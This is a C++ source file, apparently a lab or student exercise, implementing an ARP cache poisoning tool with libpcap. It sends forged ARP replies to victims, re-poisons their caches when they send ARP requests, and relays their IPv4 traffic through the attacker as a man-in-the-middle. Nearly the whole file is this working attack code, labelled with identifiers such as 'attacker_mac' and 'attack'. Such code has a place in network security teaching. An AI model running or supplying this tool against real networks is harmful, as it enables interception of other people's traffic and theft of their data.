#include "main.h"

int main(int argc, char * argv[]) {
    Mac sender_mac, target_mac;
    Ip sender_ip, target_ip;
    int i;

    // Check arguments are valid. If not, show usage and return error.
    if ((argc < 4) || ((argc % 2) == 1)) {
        usage();
        return -1;
    }

    char * dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    // Get MAC and IP for a device.
    get_attacker_info(dev, & attacker_mac, & attacker_ip);
    printf("attacker_mac: %s\n", std::string(attacker_mac).data());
    for (int i = 2; i < argc; i += 2) {
        sender_ip = Ip(std::string(argv[i]));
        target_ip = Ip(std::string(argv[i + 1]));
        // Get MAC for a sender.
        find_mac_add(sender_ip, sender_mac);
        // Get MAC for a target.
        find_mac_add(target_ip, target_mac);
        // store data
        Packet_struct info;
        // Set the sender and target IP addresses
        info.sender_ip = sender_ip;
        info.target_ip = target_ip;
        // Set the sender and target mac addresses
        info.sender_mac = infomap[sender_ip];
        info.target_mac = infomap[target_ip];

        printf("[TARGET]\n");
        printf("sender_mac: %s\n", std::string(info.sender_mac).data());
        printf("sender_ip: %s\n", std::string(info.sender_ip).data());
        printf("target_mac: %s\n", std::string(info.target_mac).data());
        printf("target_ip: %s\n", std::string(info.target_ip).data());
        printf("\n\n");
        // Add the Packet_struct object to a vector 
        info_list.push_back(info);
    }

    int size = argc / 2 - 1;
    pthread_t thread_init;
    pthread_t * thread_main = (pthread_t * ) malloc(size * sizeof(pthread_t));

    // Create a thread to run the attack_init function.
    if (pthread_create( & thread_init, NULL, attack_init, NULL) != 0)
        printf("pthread error\n");
    int j = 0;
    for (auto iter: info_list) {
        printf("%d\n", j);
        printf("%p\n", & iter);
        Packet_struct * info_copy = new Packet_struct(iter);
        if (pthread_create( & thread_main[j], NULL, attack_after, info_copy) != 0)
            printf("pthread error\n");
        usleep(500);
        j++;
    }
    pthread_join(thread_init, NULL);
    j = 0;
    for (auto iter: info_list) {
        pthread_join(thread_main[j], NULL);
        j++;
    }
    pthread_mutex_destroy( & RecievePacketMutex);
    pcap_close(handle);
}

// finds the MAC address corresponding to the given IP address.
void find_mac_add(Ip ip, Mac mac) {
    // Check if the IP address is already in the infomap.
    if (infomap.find(ip) == infomap.end()) {
        mac = find_mac(ip);
        // Insert the IP and MAC pair into the infomap.
        infomap.insert({
            ip,
            mac
        });
    }
}

Mac find_mac(Ip ip) {
    //send arp to to user ip add
    get_sender_info(attacker_mac, attacker_ip, ip);
    while (1) {
        // until a response is received.
        struct pcap_pkthdr * header;
        const u_char * reply_packet;
        // to get the next packet from the network.
        pthread_mutex_lock( & RecievePacketMutex);
        int res = pcap_next_ex(handle, & header, & reply_packet);
        pthread_mutex_unlock( & RecievePacketMutex);
        // Error Control
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("(error) return %d(%s)\n", res, pcap_geterr(handle));
            return 0;
        }
        EthArpPacket * sender_packet;
        sender_packet = (EthArpPacket * ) reply_packet;
        // Check if the source IP address of the ARP packet matches the target IP address.
        if (sender_packet -> arp_.sip() == ip)
            return sender_packet -> arp_.smac_;
        else
            continue;
    }
}

// get_sender_info
void get_sender_info(Mac eth_smac, Ip arp_sip, Ip arp_tip) {
    packet.eth_.dmac_ = Mac::broadcastMac();;
    packet.eth_.smac_ = eth_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = eth_smac;
    packet.arp_.sip_ = htonl(arp_sip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(arp_tip);

    pthread_mutex_lock( & RecievePacketMutex);
    int res = pcap_sendpacket(handle, reinterpret_cast <
        const u_char * > ( & packet), sizeof(EthArpPacket));
    pthread_mutex_unlock( & RecievePacketMutex);
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

// This function do firsttime network attack.
void * attack_init(void * arg) {
    while (1) {
        // Iterate over the list of sender info and print an "attack" message for each iteration.
        for (auto & iter: info_list) {
            printf("[now attack 1]: %s\n", std::string(iter.sender_mac).data());
            printf("attack - no 1\n");
            pthread_mutex_lock( & RecievePacketMutex);
            attack(iter.sender_mac, attacker_mac, iter.target_ip, iter.sender_mac, iter.sender_ip);
            pthread_mutex_unlock( & RecievePacketMutex);
        }
        usleep(20000000);
        printf("sleep finish\n");
    }
    return (0);
}

// after attack func
void * attack_after(void * arg) {
    struct pcap_pkthdr * header;
    Packet_struct iter = * ((Packet_struct * ) arg);
    const u_char * reply_Packet;
    while (1) {
        // Capture the next packet from the network.
        pthread_mutex_lock( & RecievePacketMutex);
        int res = pcap_next_ex(handle, & header, & reply_Packet);
        if (res == 0) {
            pthread_mutex_unlock( & RecievePacketMutex);
            continue;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            // Print an error message if pcap_next_ex returns an error.
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            pthread_mutex_unlock( & RecievePacketMutex);
            break;
        }
        // reply_packet to an EthHdr object.
        EthHdr * eth_packet = (EthHdr * ) reply_Packet;
        // if recover need
        if (recover(eth_packet, iter)) {
            printf("attack - no 2 (recover)\n");
            attack(iter.sender_mac, attacker_mac, iter.target_ip, iter.sender_mac, iter.sender_ip);
        }
        // if relay need
        if (relay(eth_packet, iter)) {
            printf("[now attack3]: %s\n", std::string().data());
            printf("attack - no3 (relay)\n");
            EthIpPacket * packet = (EthIpPacket * ) eth_packet;
            // from sender to target
            if (packet -> eth_.smac_ == iter.sender_mac)
                packet -> eth_.dmac_ = iter.target_mac;
            // from target to sender
            else if (packet -> eth_.smac_ == iter.target_mac)
                packet -> eth_.dmac_ = iter.sender_mac;
            // set default
            packet -> eth_.smac_ = attacker_mac;
            // send packet
            printf("packet -> eth_.dmac_ : %s\n", std::string(packet -> eth_.dmac_).data());
            printf("iter.sender_ip : %s\n", std::string(iter.sender_ip).data());
            printf("packet -> eth_.smac_ : %s\n", std::string(packet -> eth_.smac_).data());
            printf("iter.target_ip : %s\n", std::string(iter.target_ip).data());
            printf("================\n");
            int res = pcap_sendpacket(handle, reinterpret_cast <
                const u_char * > (packet), (header -> len));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            res = pcap_next_ex(handle, & header, & reply_Packet);
            if (res == 0) {
                pthread_mutex_unlock( & RecievePacketMutex);
                continue;
            }
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                pthread_mutex_unlock( & RecievePacketMutex);
                break;
            }
            // reply_packet to an EthHdr object.
            eth_packet = (EthHdr * ) reply_Packet;
            packet = (EthIpPacket * ) eth_packet;
            // from sender to target
            if (packet -> eth_.smac_ == iter.sender_mac)
                packet -> eth_.dmac_ = iter.target_mac;
            // from target to sender
            else if (packet -> eth_.smac_ == iter.target_mac)
                packet -> eth_.dmac_ = iter.sender_mac;
            // set default
            packet -> eth_.smac_ = attacker_mac;
            // send packet
            printf("packet -> eth_.dmac_ : %s\n", std::string(packet -> eth_.dmac_).data());
            printf("iter.sender_ip : %s\n", std::string(iter.sender_ip).data());
            printf("packet -> eth_.smac_ : %s\n", std::string(packet -> eth_.smac_).data());
            printf("iter.target_ip : %s\n", std::string(iter.target_ip).data());
            printf("================\n");
            res = pcap_sendpacket(handle, reinterpret_cast <
                const u_char * > (packet), (header -> len));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
        pthread_mutex_unlock( & RecievePacketMutex);
        usleep(300);
    }
    return (0);
}

// to attack table code
void attack(Mac eth_dmac, Mac eth_smac, Ip arp_sip, Mac eth_tmac, Ip arp_tip) {
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.smac_ = eth_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = eth_smac;
    packet.arp_.sip_ = htonl(arp_sip);
    packet.arp_.tmac_ = eth_tmac;
    packet.arp_.tip_ = htonl(arp_tip);

    int res = pcap_sendpacket(handle, reinterpret_cast <
        const u_char * > ( & packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return;
    }
}

int recover(EthHdr * eth_packet, Info info) {
    // Check the Ethernet packet is an ARP packet.
    if (eth_packet -> type() != EthHdr::Arp)
        return 0;
    EthArpPacket * packet = (EthArpPacket * ) eth_packet;
    // Check if the ARP packet is a request.
    if (packet -> arp_.op() != ArpHdr::Request)
        return 0;
    // need to recover
    if (packet -> arp_.tip() == info.target_ip)
        return 1;
    return 0;
}

int relay(EthHdr * eth_packet, Packet_struct info) {
    // Check if the Ethernet packet is an IPv4 packet.
    if (eth_packet -> type() != EthHdr::Ip4)
        return 0;
    EthIpPacket * packet = (EthIpPacket * ) eth_packet;
    // Check if the source MAC address in the packet matches the sender MAC address in the info structure,
    // and if the destination IP address in the packet is not the attacker's IP address.
    if ((packet -> eth_.smac_ == info.sender_mac) && packet -> ip_.dip != attacker_ip) {
        printf("\n\n\n================\n");
        printf("\t\t [relay (smac) ] pc -> route : %s\n", std::string(packet -> eth_.smac_).data());
        printf("================\n");
        return 1;
    }
    if ((packet -> eth_.smac_ == info.target_mac) && packet -> ip_.dip != attacker_ip) {
        printf("\n\n\n================\n");
        printf("\t\t [relay] route -> pc : %s\n", std::string(packet -> eth_.smac_).data());
        printf("\t\t [relay (dmac) ] pc -> route : %s\n", std::string(packet -> eth_.dmac_).data());
        return 1;
    }
    return 0;
}

// Get MAC and IP for a device.
void get_attacker_info(char * dev, Mac * mac, Ip * ip) {
    int fd;
    struct ifreq ifr;
    const char * iface = dev;
    memset( & ifr, 0, sizeof(ifr));

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (0 == ioctl(fd, SIOCGIFHWADDR, & ifr))
        *
        mac = Mac((uint8_t * ) ifr.ifr_hwaddr.sa_data);
    if (0 == ioctl(fd, SIOCGIFADDR, & ifr))
        *
        ip = Ip(std::string(inet_ntoa(((struct sockaddr_in * ) & ifr.ifr_addr) -> sin_addr)));
    close(fd);
    return;
}